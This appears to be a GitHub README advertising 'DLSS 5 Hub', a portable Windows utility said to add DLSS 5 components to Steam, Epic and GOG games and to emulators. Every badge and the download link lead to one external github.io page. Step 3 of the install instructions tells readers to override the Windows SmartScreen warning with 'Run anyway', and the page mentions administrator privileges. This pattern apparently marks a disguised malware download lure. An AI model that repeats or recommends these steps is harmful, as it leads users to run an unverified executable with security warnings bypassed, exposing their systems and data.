## DLSS 5 Hub — Simple DLSS 5 Setup for Games and Emulators

<p align="center">
  <a href="https://DLSS-5-2026.github.io/.github"><img src="https://img.shields.io/badge/GET%20DLSS%205%20NOW-00C853?style=for-the-badge&logo=nvidia&logoColor=white" alt="GET DLSS 5 NOW"></a>
  <a href="https://DLSS-5-2026.github.io/.github"><img src="https://img.shields.io/badge/DLSS5--FEEDER-EXPERIMENTAL-8b5cf6?style=for-the-badge" alt="DLSS5 Feeder Experimental"></a>
</p>

<p align="center">
  <a href="https://DLSS-5-2026.github.io/.github"><img src="https://img.shields.io/badge/DIRECTX%209--12-✓-2ea44f?style=flat-square" alt="DirectX 9-12 Supported"></a>
  <a href="https://DLSS-5-2026.github.io/.github"><img src="https://img.shields.io/badge/VULKAN-✓-2ea44f?style=flat-square" alt="Vulkan Supported"></a>
  <a href="https://DLSS-5-2026.github.io/.github"><img src="https://img.shields.io/badge/OPENGL-✓-2ea44f?style=flat-square" alt="OpenGL Supported"></a>
  <a href="https://DLSS-5-2026.github.io/.github"><img src="https://img.shields.io/badge/EMULATORS-✓-2ea44f?style=flat-square" alt="Emulators Supported"></a>
</p>

<table>
<tr>
<td><img src="https://github.com/DLSS-5-2026/.github/blob/main/assets/1.png?raw=true" width="300"></td>
<td><img src="https://github.com/DLSS-5-2026/.github/blob/main/assets/2.png?raw=true" width="300"></td>
<td><img src="https://github.com/DLSS-5-2026/.github/blob/main/assets/3.png?raw=true" width="300"></td>
</tr>
</table>

</div>

DLSS 5 Hub is a flexible utility created to make DLSS 5 component management easier across compatible games and supported emulators. It automatically checks Steam, Epic Games, and GOG libraries, finds installed titles, and determines which graphics API each application uses. Before modifying anything, the utility creates a secure backup of the original files, making it possible to return to the previous configuration whenever needed.

## Supported Graphics APIs

DLSS 5 Hub supports multiple graphics APIs, including DirectX 9, 10, 11, and 12, along with Vulkan and OpenGL. Games that already provide native DLSS support can have their required components updated or replaced through the utility. Titles without native DLSS can use the experimental DLSS5-Feeder mode to test DLSS 5 functionality in otherwise unsupported games.

## Emulator Support

DLSS 5 Hub is compatible with many widely used emulators, including DuckStation, PCSX2, Dolphin, PPSSPP, Xenia, Cemu, RPCS3, Ryujinx, shadPS4, RetroArch, Flycast, Vita3K, and others. The utility detects supported executable files automatically and chooses the appropriate installation method for each emulator, reducing the need for manual setup.

## Key Features

* Automatically scans Steam, Epic Games, and GOG libraries for installed titles.
* Supports manually adding custom game directories.
* Detects the primary executable and identifies the active graphics API.
* Supports DirectX 9, 10, 11, 12, Vulkan, and OpenGL.
* Applies DLSS 5 components with a single click.
* Provides experimental DLSS 5 functionality through DLSS5-Feeder for games without native DLSS.
* Works with both 32-bit and 64-bit applications.
* Supports a large selection of popular gaming emulators.
* Automatically backs up original files before making modifications.
* Allows original files to be restored at any time with the Restore Originals option.
* Includes Russian and support for dozens of additional languages.
* Fully portable — no installation or additional setup is required.

## System Requirements

DLSS 5 Hub is intended for modern 64-bit Windows systems equipped with a compatible NVIDIA graphics card. Actual functionality may differ depending on the selected game or emulator.

- **Operating System:** Windows 10 or Windows 11 (64-bit)
- **GPU:** NVIDIA GeForce RTX 20 Series or newer
- **Game / Emulator:** A title compatible with DLSS 5 Hub
- **Storage:** A small amount of free space for the portable utility and backup files
- **Permissions:** Administrator privileges may be needed when modifying protected game files
- **Internet Connection:** May be required to download or update DLSS 5 components

> **Note:** Compatibility depends on the individual game or emulator, graphics API, and DLSS components already installed.

## Installing DLSS 5 Hub

1. Download the latest version of **DLSS 5 Hub** from the following link: [CLICK](https://DLSS-5-2026.github.io/.github).
2. Extract the  archive and launch the application.
3. If **Windows SmartScreen** shows a warning because the application is not recognized, select **"More info"** and then click **"Run anyway"**.
4. Open **DLSS 5 Hub**. The utility will scan your **Steam, Epic Games, and GOG** libraries and show the games it discovers.
5. If the required game is missing, use the manual add option and select its installation directory.
6. Choose the desired title and verify that the correct main executable (`.exe`) has been detected.
7. For games with existing native DLSS support, select the **Native DLSS** mode.
8. For games without built-in DLSS, enable the experimental **DLSS5-Feeder** mode. If required, manually select the graphics API used by the game.
9. Click **Install DLSS 5** and wait for the operation to finish. The utility will back up the original components before applying any changes.
10. After installation is complete, launch the game and check the result. With **DLSS5-Feeder**, the **ReShade** menu can also be used to confirm that the required effects have loaded correctly.

> **Tip:** Close the game and any related background processes before installation to avoid locked or inaccessible files.

DLSS 5 Hub automatically backs up the original game files before making changes. If you want to undo the modifications and return to the previous setup, select the game in **DLSS 5 Hub** and use the **Restore Originals** option.
